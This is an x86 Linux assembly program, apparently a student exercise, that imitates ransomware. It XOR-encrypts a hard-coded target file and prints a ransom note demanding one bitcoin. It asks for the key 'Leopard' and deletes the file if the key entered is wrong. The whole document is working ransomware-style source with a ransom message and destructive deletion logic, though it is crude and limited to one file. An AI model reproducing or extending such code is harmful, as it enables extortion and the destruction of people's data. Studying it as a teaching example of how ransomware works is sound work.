section .data
    Encryption_Progress db "+----------------------------------------------------------+", 13, 10,
    					db "| [**]  DEVELOPED BY: 231290, 231296, 231338, 231334  [**] |", 13, 10,
    					db "+----------------------------------------------------------+", 13, 10,
    					db "| [!] ALERT: ENCRYPTING ALL YOUR FILES !!!                 |", 13, 10,
    					db "| [+] TASK-PROGRESS: 20%   (1.Starting Quantum Computers)  |", 13, 10,
    					db "| [+] TASK-PROGRESS: 40%   (2.Calculating Files Hashes)    |", 13, 10,
    					db "| [+] TASK-PROGRESS: 60%   (3.Finding your Personal Files) |", 13, 10,
    					db "| [+] TASK-PROGRESS: 80%   (4.Initating Encryption Process)|", 13, 10,
    					db "| [+] TASK-COMPLETE: 100%  (5.Encrypting your Secret File) |", 13, 10,
    					db "+----------------------------------------------------------+", 13, 10, 0
    Encryption_Progress_len EQU $ - Encryption_Progress
    Decryption_Message db "| [+] INFO: ENCRYPTION SUCCESSFUL!!                        |", 13, 10,
                       db "| [!] SEND ME 1 BTC TO HAVE THE KEY TO DECRYPT YOUR FILES  |", 13, 10,
                       db "| [!] ELSE YOUR FILES WILL BE DELETED PERMANENTLY.         |", 13, 10,
                       db "+----------------------------------------------------------+", 13, 10,
                       db "| [*] INPUT: Enter the Key to Decrypt your Files #: ", 0h
    Decryption_Message_len EQU $ - Decryption_Message
    FileOpenFailedMessage db "| [-] ALERT: Couldn't Open The Target file. LUCKY YOU", 13, 10, 0h
    FileOpenFailedMessageLen EQU $ - FileOpenFailedMessage
    FileReadFailedMessage db "| [-] ALERT: Couldn't Read The Target file. LUCKY YOU", 13, 10, 0h
    FileReadFailedMessageLen EQU $ - FileReadFailedMessage
    FileWriteFailedMessage db "| [-] ALERT: Couldn't Write To Target file. LUCKY YOU", 13, 10, 0h
    FileWriteFailedMessageLen EQU $ - FileWriteFailedMessage
    InputFailedMessage db "| [-] ALERT: Couldn't Take input of the Key Correctly. OOPS!", 13, 10, 0h
    InputFailedMessageLen EQU $ - InputFailedMessage
    Incorrect_key db "+----------------------------------------------------------+", 13, 10,
    			  db "| [-] ALERT: INCORRECT KEY. Your Files will be Deleted Now |", 13, 10,
    			  db "+----------------------------------------------------------+", 13, 10, 0h
    Incorrect_key_len EQU $ - Incorrect_key
    Correct_Key_Input db "+----------------------------------------------------------+", 13, 10,
    				  db "| [+] ALERT: CORRECT KEY. Your Files are being Decrypted!! |", 13, 10, 0h
    Correct_Key_Input_len EQU $ - Correct_Key_Input
    Decryption_Successfull db "+----------------------------------------------------------+", 13, 10,
    					   db "| [+] CONGRATS: FILES DECRYPTED SUCCESSFULLY. ENJOY!!      |", 13, 10,
                           db "+----------------------------------------------------------+", 13, 10, 0h
    Decryption_Successfull_len EQU $ - Decryption_Successfull
    TargetFile db "./Target-Dir/TargetFile.txt", 0h
    Correct_Key_Value db "Leopard", 0h
    mode dd 00212010h

section .bss
    File_Descripter_Handler resd 1              ; File Descripter to Hold File Indicator
    BytesRead resd 1                            ; Flag to determine if bytes read or not
    BytesWritten resd 1                         ; Flag to determine if bytes written or not
    File_Buffer resb 8192                       ; Buffer to hold File Data for Processings
    error_code resd 1                           ; flag to determine if error Generated or not
    Key_Guess_Input resb 20                     ; Reserving Byte to Read Key Guess Later
    Sleep_Duration resb 8                       ; Nanosleep structure for Hacker Typing Message

section .text
    global _start                               ; Indicating Where to start

_start:
	mov dword [Sleep_Duration], 0               ; Setting Seconds = 0
	mov dword [Sleep_Duration+4], 20000000      ; Setting Nanoseconds = 20,000,000
	lea esi, [Encryption_Progress]              ; Pointer to message to be Printed
	mov edi, Encryption_Progress_len            ; Message length
PRINT_LOOP:
	cmp edi, 0                                  ; check if Characters ended
    je CONTINUE_PROCESSING                      ; If Yes, Move to Encryption part

    mov eax, 4                                  ; Write System Call
    mov ebx, 1                                  ; File descriptor (stdout)
    lea ecx, [esi]                              ; Address of current char
    mov edx, 1                                  ; Length (1 byte) to Print 1 Character
    int 0x80                                    ; System call

    mov eax, 162                                ; Nano Sleep System Call for Delay
    lea ebx, [Sleep_Duration]                   ; Request structure
    mov ecx, 0                                  ; No remaining time
    int 0x80                                    ; System call

    inc esi                                     ; Mov to Next character
    dec edi                                     ; Decrement the Loop Counter
    jmp PRINT_LOOP                              ; Jump Unconditionally print next Character

CONTINUE_PROCESSING:
    mov eax, 5                                  ; Open System Call
    mov ebx, TargetFile                         ; Absolute FilePath
    mov ecx, 0                                  ; O_RDONLY (Read Only)
    mov edx, 0                                  ; no special flags
    int 0x80                                    ; system call
    test eax, eax                               ; check if file open succeeded
    js File_Open_Failed                         ; Jump to Error Message
    mov [File_Descripter_Handler], eax          ; store file descriptor

    mov eax, 3                                  ; Read System Call
    mov ebx, [File_Descripter_Handler]          ; File Descriptor
    lea ecx, [File_Buffer]                      ; Buffer Address
    mov edx, 8192                               ; Number of bytes to read
    int 0x80                                    ; System call
    test eax, eax                               ; check if data was read
    jz File_Read_Failed                         ; Jump to Error Message
    mov [BytesRead], eax                        ; Store Bytes read
    cmp eax, 0                                  ; check for EOF
    je DONE_ENCRYPTION                        ; if EOF, skip encryption

    mov esi, 0                                  ; buffer index
    mov ebx, 0x4c494f4e                         ; XOR key

ENCRYPTION_LOOP:
    mov al, byte [File_Buffer + esi]            ; load BYTE from buffer
    xor al, bl                                  ; XOR Operation
    mov byte [File_Buffer + esi], al            ; Store Encrypted BYTE
    inc esi                                     ; Increment buffer index
    cmp esi, [BytesRead]                        ; Check if we've processed all bytes
    jl ENCRYPTION_LOOP                          ; if not, continue

    mov eax, 5                                  ; Open System Call
    mov ebx, TargetFile                         ; Absolute FilePath
    mov ecx, 2                                  ; O_RDWR (Read and Write)
    mov edx, 0x2000                             ; O_TRUNC flag (truncate file)
    int 0x80                                    ; system call
    test eax, eax                               ; check if file open succeeded
    js File_Open_Failed                         ; Jump to Error Message
    mov [File_Descripter_Handler], eax          ; store file descriptor

    mov eax, 4                                  ; Write System Call
    mov ebx, [File_Descripter_Handler]          ; File Descriptor
    lea ecx, [File_Buffer]                      ; Buffer Address
    mov edx, [BytesRead]                        ; Number of bytes read
    int 0x80                                    ; system call
    test eax, eax                               ; check if write was successful
    js File_Write_Failed                        ; Jump to Error Message
    mov [BytesWritten], eax                     ; store bytes written

DONE_ENCRYPTION:
    mov eax, 6                                  ; Close System Call
    mov ebx, [File_Descripter_Handler]          ; File Descriptor
    int 0x80                                    ; System call

DECRYPTION_MESSAGE:
    mov eax, 4                                  ; Write System Call
    mov ebx, 1                                  ; File Descriptor (stdout)
    mov ecx, Decryption_Message                 ; Message
    mov edx, Decryption_Message_len             ; Message Length
    int 0x80                                    ; System Call

	mov eax, 3                                  ; Read System Call
	mov ebx, 0                                  ; File Descriptor (StdIn)
	mov ecx, Key_Guess_Input                    ; Variable to store to input in
	mov edx, 20                                 ; Size of input to read
	int 0x80                                    ; System Call
	test eax, eax                               ; Check if Input taken Correctly
	jz Input_Failed_Call                        ; Jump to Failed Input if error

	mov ecx, 7                                  ; Mov 7 in ECX to Iterate over 7 letters of the Key
	lea esi, [Key_Guess_Input]                  ; Pointer to the user input
	lea edi, [Correct_Key_Value]                ; Pointer to the correct key "Leopard"

Key_Checking_loop:
	mov al, [esi]                               ; Load the current byte from user input
    mov bl, [edi]                               ; Load the current byte from the correct key
    cmp al, bl                                  ; Compare the bytes
    jne INCORRECT_KEY_INPUT                     ; Jump if the characters don't match
    inc esi                                     ; Move to the next byte of the user input
    inc edi                                     ; Move to the next byte of the correct key
    loop Key_Checking_loop                      ; Repeat for all 7 characters
    jmp CORRECT_KEY_INPUT                       ; If all bytes match, jump to decryption section

INCORRECT_KEY_INPUT:
    mov eax, 4                                  ; Write System Call
    mov ebx, 1                                  ; File Descriptor (stdout)
    mov ecx, Incorrect_key                      ; Message
    mov edx, Incorrect_key_len                  ; Message Length
    int 0x80                                    ; System Call

    mov eax, 10                                 ; Unlink System Call (Delete File)
    mov ebx, TargetFile                         ; Moving File to be Deleted into EBX
    int 0x80                                    ; System Call
    jmp ExitProgram                             ; Exit the Program

CORRECT_KEY_INPUT:
    mov eax, 4                                  ; Write System Call
    mov ebx, 1                                  ; File Descriptor (stdout)
    mov ecx, Correct_Key_Input                  ; Message
    mov edx, Correct_Key_Input_len              ; Message Length
    int 0x80                                    ; System Call

    mov eax, 5                                  ; Open System Call
    mov ebx, TargetFile                         ; Absolute FilePath
    mov ecx, 0                                  ; O_RDONLY (Read Only)
    mov edx, 0                                  ; no special flags
    int 0x80                                    ; system call
    test eax, eax                               ; check if file open succeeded
    js File_Open_Failed                         ; Jump to Error Message
    mov [File_Descripter_Handler], eax          ; store file descriptor

    mov eax, 3                                  ; Read System Call
    mov ebx, [File_Descripter_Handler]          ; File Descriptor
    lea ecx, [File_Buffer]                      ; Buffer Address
    mov edx, 8192                               ; Number of bytes to read
    int 0x80                                    ; System call
    test eax, eax                               ; check if data was read
    jz File_Read_Failed                         ; Jump to Error Message
    mov [BytesRead], eax                        ; Store Bytes read
    cmp eax, 0                                  ; check for EOF
    je DONE_DECRYPTION                          ; if EOF, skip encryption

    mov esi, 0                                  ; buffer index
    mov ebx, 0x4c494f4e                         ; XOR key

DECRYPTION_LOOP:
    mov al, byte [File_Buffer + esi]            ; load BYTE from buffer
    xor al, bl                                  ; XOR Operation
    mov byte [File_Buffer + esi], al            ; Store Encrypted BYTE
    inc esi                                     ; Increment buffer index
    cmp esi, [BytesRead]                        ; Check if we've processed all bytes
    jl DECRYPTION_LOOP                          ; if not, continue

    mov eax, 5                                  ; Open System Call
    mov ebx, TargetFile                         ; Absolute FilePath
    mov ecx, 2                                  ; O_RDWR (Read and Write)
    mov edx, 0x2000                             ; O_TRUNC flag (truncate file)
    int 0x80                                    ; system call
    test eax, eax                               ; check if file open succeeded
    js File_Open_Failed                         ; Jump to Error Message
    mov [File_Descripter_Handler], eax          ; store file descriptor

    mov eax, 4                                  ; Write System Call
    mov ebx, [File_Descripter_Handler]          ; File Descriptor
    lea ecx, [File_Buffer]                      ; Buffer Address
    mov edx, [BytesRead]                        ; Number of bytes read
    int 0x80                                    ; system call
    test eax, eax                               ; check if write was successful
    js File_Write_Failed                        ; Jump to Error Message
    mov [BytesWritten], eax                     ; store bytes written

DONE_DECRYPTION:
    mov eax, 6                                  ; Close System Call
    mov ebx, [File_Descripter_Handler]          ; File Descriptor
    int 0x80                                    ; System call

    mov eax, 4                                  ; Write System Call
    mov ebx, 1                                  ; File Descriptor (stdout)
    mov ecx, Decryption_Successfull             ; Message
    mov edx, Decryption_Successfull_len         ; Message Length
    int 0x80                                    ; System Call

    jmp ExitProgram                             ; Exit the Program

File_Open_Failed:
    mov eax, 4                                  ; Write System Call
    mov ebx, 1                                  ; File Descriptor (stdout)
    mov ecx, FileOpenFailedMessage              ; Message
    mov edx, FileOpenFailedMessageLen           ; Message Length
    int 0x80                                    ; System Call

    mov [error_code], eax                       ; Save the Error Code from EAX
    mov eax, 4                                  ; Write System Call
    mov ebx, 1                                  ; File Descriptor (StdOut)
    lea ecx, [error_code]                       ; Error Message
    mov edx, 4                                  ; Length of error code
    int 0x80                                    ; System Call
    jmp ExitProgram                             ; Exit the Program

File_Read_Failed:
    mov eax, 4                                  ; Write System Call
    mov ebx, 1                                  ; File Descriptor (stdout)
    mov ecx, FileReadFailedMessage              ; Message
    mov edx, FileReadFailedMessageLen           ; Message Length
    int 0x80                                    ; System Call

    mov [error_code], eax                       ; Save the Error Code from EAX
    mov eax, 4                                  ; Write System Call
    mov ebx, 1                                  ; File Descriptor (StdOut)
    lea ecx, [error_code]                       ; Error Message
    mov edx, 4                                  ; Length of error code
    int 0x80                                    ; System Call
    jmp ExitProgram                             ; Exit the Program

File_Write_Failed:
    mov eax, 4                                  ; Write System Call
    mov ebx, 1                                  ; File Descriptor (stdout)
    mov ecx, FileWriteFailedMessage             ; Message
    mov edx, FileWriteFailedMessageLen          ; Message Length
    int 0x80                                    ; System Call

    mov [error_code], eax                       ; Save the Error Code from EAX
    mov eax, 4                                  ; Write System Call
    mov ebx, 1                                  ; File Descriptor (StdOut)
    lea ecx, [error_code]                       ; Error Message
    mov edx, 4                                  ; Length of error code
    int 0x80                                    ; System Call
    jmp ExitProgram                             ; Exit the Program

Input_Failed_Call:
    mov eax, 4                                  ; Write System Call
    mov ebx, 1                                  ; File Descriptor (stdout)
    mov ecx, InputFailedMessage                 ; Message
    mov edx, InputFailedMessageLen              ; Message Length
    int 0x80                                    ; System Call

    mov [error_code], eax                       ; Save the Error Code from EAX
    mov eax, 4                                  ; Write System Call
    mov ebx, 1                                  ; File Descriptor (StdOut)
    lea ecx, [error_code]                       ; Error Message
    mov edx, 4                                  ; Length of error code
    int 0x80                                    ; System Call
    jmp ExitProgram                             ; Exit the Program

ExitProgram:
    mov eax, 1                                  ; Exit System call
    xor ebx, ebx                                ; exit code 0
    int 0x80                                    ; System Call
